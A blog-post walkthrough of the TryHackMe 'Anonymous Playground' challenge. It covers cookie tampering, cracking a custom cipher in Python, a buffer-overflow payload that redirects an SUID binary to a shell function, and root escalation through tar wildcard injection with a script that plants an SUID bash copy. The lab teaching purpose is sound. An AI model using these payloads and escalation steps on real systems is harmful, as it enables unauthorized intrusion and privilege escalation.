---
layout: post
title:  "Anonymous Playground Writeup"
date:   2024-05-23 13:15:45 -0400
categories: tryhackme hard
tags: writeup tryhackme hard CTF
---
## Introduction
This is a hard challenge box on
[TryHackMe](https://tryhackme.com/r/room/anonymousplayground){:target="_blank"}{:rel="noopener noreferrer"}.
It'll take 3-5 minutes to boot up

> This is what a hint will look like!
{: .prompt-tip }

## Enumeration
### Port Scan
First things first, lets see what ports are open
```bash
rustscan -a VICTIM_IP -- -A -oA scan -sC
```

![scan1](/images/apg/apg-scan1.png)

![scan2](/images/apg/apg-scan2.png)

There are only two ports open
- 22: SSH
- 80: HTTP

### Website
Let's investigate the home page to see what we can access by default

![homepage](/images/apg/apg-homepage.png)

There are three links at the top of the page.
The operatives tab is the only one that leads somewhere

![operatives](/images/apg/apg-operatives.png)

A list of members and potential usernames. Keep this in mind for later

Now let's see if there are hidden directories in `robots.txt`

![robots.txt](/images/apg/apg-robots.png)

That's a suspicious directory... What happens when we try to access it?

![access-denied](/images/apg/apg-access-denied.png)

Hmm we don't have the proper clearance

> Where could web credentials be stored?
{: .prompt-tip }

By checking our cookies we see the following

![cookies](/images/apg/apg-cookies.png)

A cookie named `access` with the value `denied`? 
What if we change the value to `granted` and refresh 
the page

![creds-cipher](/images/apg/apg-creds-cipher.png)

These look like credentials! This cipher doesn't look familiar so it seems like we need to crack it ourselves

## Initial Foothold
### Deciphering
First let's look at the full ciphertext
> Is there a pattern?
{: .prompt-tip }

```
hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN
```

The string always follows the pattern of a lowercase letter followed by an uppercase letter. Put another way we can say every pair of letters is the same as one plaintext letter

The pair of colons is the only exception, but it seems like this was intended to separate the username from the password

> Are there any operatives (usernames) which could be used to decipher the username?
{: .prompt-tip }

Since we have a potential list of usernames given to us in
`/operatives.php` lets focus on the username we are given

```bash
hEzAdCfHzA
# adding a space between character pairs
hE zA dC fH zA
```

The username is 5 characters long and uses the same character in the 2nd and 5th position. Looking at the list of operatives there is only one username which matches these constraints

```
magna
hE zA dC fH zA
m  a  g  n  a
```

Alright we have a few characters mapped, now we can start decoding

> What are the positions of each letter in the alphabet?
{: .prompt-tip }

First we'll set the characters in the form of an equation

```
d C = g
h E = m
f H = n
```

Now we can map letters by their position in the alphabet: a=1, b=2, c=3 ...

```
4 3 = 7
8 5 = 13
6 8 = 14
```

The pattern becomes clear, we add the position of each letter in the pair to get the position of the decoded letter! The only exception is the first character

```
z A = a
26 + 1 = 1
```

This is easily solved by making the position wrap around to the beginning if it goes over the length of the alphabet. In other words, we can just take the remainder of the final index divided by the alphabet length

The deciphering algorithm in python

```python
#!/bin/python3

# password ciphertext
cipher = 'hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN'
alpha = 'abcdefghijklmnopqrstuvwxyz'
plain = ''

for i in range(0, len(cipher), 2):
        a = cipher[i]
        b = cipher[i+1].lower()

        # add position of each letter
        index = alpha.find(a) + alpha.find(b)

        # have a=1 rather than a=0
        index += 1

        # adjust for wrap around
        index %= len(alpha)

        plain += alpha[index]

print(plain)
```

By running this script, we decode the password for magna! Recall port 22 is open so if we try to login as magna...

```bash
ssh magna@VICTIM_IP
```

![flag1](/images/apg/apg-flag1.png)

We're in!!!

### Hacky Solution
An alternate method for deciphering the text. This is the method I found first and serves as a reminder that there isn't only one solution
> What operations can you perform on ASCII characters?
{: .prompt-tip }

We already have a few characters with their encoded equivalent, so let's try to work backwards. To make it easier we can set it up as an equation

```
d C = g
h E = m
f H = n
```

ASCII is a standard which gives characters an equivalent 
numerical value. 
[Here's a table of values ](https://www.asciitable.com/){:target="_blank"}{:rel="noopener noreferrer"}
which we'll use to convert the characters into numbers

```
100 67 = 103
104 69 = 109
102 72 = 110
```
> What operations can we do on the left side to get 
> the value on the right?
{: .prompt-tip }

After experimenting we see the following pattern

```
(100 + 67) - 64 = 103
(104 + 69) - 64 = 109
(102 + 72) - 64 = 110
```

This pattern holds for every characters except for `a`

```
z A = a
122 65 = 97
(122 + 65) - 64 = 123

# converted ascii
z A = {
```

Looking at the ASCII table, this is the character right 
after lowercase `z` (122)

![ascii-table](/images/apg/apg-ascii-table.png)

We can just create an exception in our python script

> Remember, we don't need to find a perfect solution, we just need to find one that works!
{: .prompt-info }

```python
#!/bin/python3

# password ciphertext
cipher = 'hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN'
plain = ''
offset = 64

for i in range(0, len(cipher), 2):
        a = cipher[i]
        b = cipher[i+1]
        
        # ord() gets the ascii value of a character
        # chr() turns an ascii value to a character
        c = chr(ord(a) + ord(b) - offset)
        
        # replacement edgcase
        if c == '{':
                c = 'a'
        plain += c

print(plain)
```

This will give us the same password!

## Horizontal Escalation
> There's a note from spooky leads us in the right direction 
{: .prompt-tip }

![spooky-note](/images/apg/apg-spooky-note.png)

The `hacktheworld`  binary with the suid bit set is our target, so lets start investigating

First I moved the binary to my machine so I could use my 
own tools. Spooky gave us some on the box like `radare2`
and `gdb` but I might as well put it through 
[ghidra](https://ghidra-sre.org/){:target="_blank"}{:rel="noopener noreferrer"}
as well

```bash
# victim machine
python3 -m http.server

# attacker machine
wget http://VICTIM_IP:8000/hacktheworld
```

After running the binary through ghidra this is our decompiled source for main

![main-source](/images/apg/apg-main-source.png)

It asks the user for some input and then ends. Luckily, this code presents a serious vulnerability
> How many characters can the buffer hold? What happens when you add more?
{: .prompt-tip }

Since the program doesn't limit how many characters a user
can write to the buffer, this is a classic 
[buffer overflow example](https://en.wikipedia.org/wiki/Buffer_overflow){:target="_blank"}{:rel="noopener noreferrer"}

### Buffer Overflows
This type of vulnerability appears when the the input received is larger than the buffer which is intended to hold that input. Once the initial buffer is filled, that extra data still gets written, but where does it go?

To keep things brief and simple, this data will start overwriting values of the program as it's running. One of these values, the instruction pointer, tells the program the address of the code to run once a function is done running . This is called when a function returns in C.

![bof-figure](/images/apg/apg-bof-figure.png)

Our goal is to overwrite the instruction pointer 
(saved `EIP`) from the buffer and force it to run code 
that wasn't intended

### Exploit Crafting
#### Buffer Size
> How many characters do we need to fill before 
> overwriting the instruction pointer?
{: .prompt-tip }

Let's calculate! To reach the instruction pointer we 
need to fill the buffer, as well as the saved base 
pointer (`EBP`). On 64 bit systems each register can hold 64 
bits or 8 bytes. Adding this value to the buffer size of 
64 bytes, we get 72 bytes!

We can test this in gdb to verify our calculations. First lets setup our input and write it to a file

```bash
python -c "print 'A'*72 + 'BCDEFGHI'" > input.txt
```

So let's run this input with `gdb`

```bash
gdb ./hacktheworld
run < input.txt
# the program should segfault
info frame
```

![gdb-test](/images/apg/apg-gdb-test.png)

The instruction pointer we're targeting is the
`saved rip` register. Let's convert the the saved rip values from hex to its ASCII equivalent

```
0x4948474645444342 -> IHGFEDCB
```
Awesome, now we can control the instruction pointer! But our original string 
(`BCDEFGHI`) has been reversed (`IHGFEDCB`).
What's the deal?

This is known as 
[little endian byte ordering](https://en.wikipedia.org/wiki/Endianness){:target="_blank"}{:rel="noopener noreferrer"}.
There are
[advantages to storing bytes in reverse order](https://softwareengineering.stackexchange.com/questions/95556/what-is-the-advantage-of-little-endian-format){:target="_blank"}{:rel="noopener noreferrer"}
but for our purposes, it's enough to remember that we need to reverse the return address in our exploit

#### Return Address
> Where should we redirect the flow of the program to?
{: .prompt-tip }

Normally I would put machine code which runs a shell into the buffer and try to jump to that area, but there is a small issue with this plan. If we run this command

```bash
cat /proc/sys/kernel/randomize_va_space
```

We can see that 
[Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization){:target="_blank"}{:rel="noopener noreferrer"}
is enabled. What this means is that the address of the 
buffer we want to jump to will change every time we run the program. We could always brute force this address but there's an easier target.

By checking the symbol tree to find other functions this binary has available, we find something interesting

![call-bash-source](/images/apg/apg-call-bash-source.png)

A function named `call_bash` which executes a shell! 
Since setuid is called before the shell is run, 
we won't end up in a root shell
> There's a shortcut to root here by calling 
> `setuid` with the argument 0 then running a shell. 
> This method is more difficult but you can look into 
> `return oriented programming` if you're interested
{: .prompt-info }

So we're going to overwrite the instruction pointer 
with the address of the `call_bash` function. We can 
find the address in ghidra

![call-bash-addr](/images/apg/apg-call-bash-addr.png)

Alternatively function addresses can also be found in 
`gdb` by running

```bash
info functions
```

![gdb-functions](/images/apg/apg-gdb-functions.png)

Remember that registers are 8 bytes long 
(2 hex characters). So in hex our return address is

```
0x0000000000400657
```

Taking little endian byte ordering into consideration, 
our input command becomes the following

```bash
python -c "print 'A'*72 + '\x57\x06\x40\x00\x00\x00\x00\x00'"
```
> Make sure you use `python` rather than `python3` 
> when creating the input since different versions 
> handle hex differently
{: .prompt-info }

### Exploiting
If we use an input file to run this, the shell will not run as intended

![bof-fail](/images/apg/apg-bof-fail.png)

A common way to solve this is to pipe the python output 
into the program. The `cat` command is also called to 
deal with `EOF` issues and keep the shell open

```bash
(python -c "print 'A'*72 + '\x57\x06\x40\x00\x00\x00\x00\x00'";cat ) | ./hacktheworld
```

When we run the binary with the input, we reach the 
function again but the shell still doesn't work correctly

Taking a look at the assembly for this function again 
can clear things up

![call-bash-asm](/images/apg/apg-call-bash-addr.png)

The address we're jumping to executes a `push` command 
which places a value onto the stack. Most likely this 
[misaligned the stack](https://stackoverflow.com/questions/64729055/what-does-aligning-the-stack-mean-in-assembly){:target="_blank"}{:rel="noopener noreferrer"}

To solve this we can skip the `push` command by 
jumping a little further into the function

```
0x0000000000400657 -> 0x0000000000400658
```

Our exploit becomes

```bash
(python -c "print 'a'*72 + '\x58\x06\x40\x00\x00\x00\x00\x00'";cat ) | ./hacktheworld
```

And....

![spooky-flag](/images/apg/apg-spooky-flag.png)

It works!!! This shell isn't particularly interactive so we can improve it just like a reverse shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# ctrl+z
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=screen
```

## Root
> Are there any processes run as root on a schedule?
{: .prompt-tip }

By checking `/etc/crontab` we can see a list of scheduled 
commands and what privileges they run with

```bash
cat /etc/crontab
```

![crontab](/images/apg/apg-crontab.png)

Every minute root will compress everything in spooky's home directory using a tar wildcard
> Can wildcards be abused when run with tar?
{: .prompt-tip }

By using 
[wildcard injection](https://www.exploit-db.com/papers/33930){:target="_blank"}{:rel="noopener noreferrer"}
we can run arbitrary commands through tar. Using 
filenames with the same format as a command flag will 
enable these options for the running program, and 
[tar has options which can execute code](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar){:target="_blank"}{:rel="noopener noreferrer"}.
We can set up the tar commands with the following

```bash
cd /home/spooky
echo 'asdf' > '--checkpoint=1'
echo 'asdf' > '--checkpoint-action=exec=sh shell.sh'
```

Now create the file `shell.sh` which creates a 
`bash` binary with `suid` permissions

```bash
#!/bin/bash
cp /bin/bash /home/spooky
chmod +s /home/spooky/bash
```

Now we just wait until the copy is made and then 
create a root shell

```bash
/home/spooky/bash -p
```

![root-flag](/images/apg/apg-root-flag.png)

## Recap
By visiting a hidden directory and modifying a cookie 
value, we're given a unique cipher to break. Comparing 
our ciphertext to potential username values we get a 
starting point for cracking. Through some ASCII 
manipulation we decipher the text and get ssh 
credentials. By abusing a buffer overflow vulnerability 
we escalate our privileges horizontally. A cron job 
vulnerable to wildcard injection gives us root 
privileges.
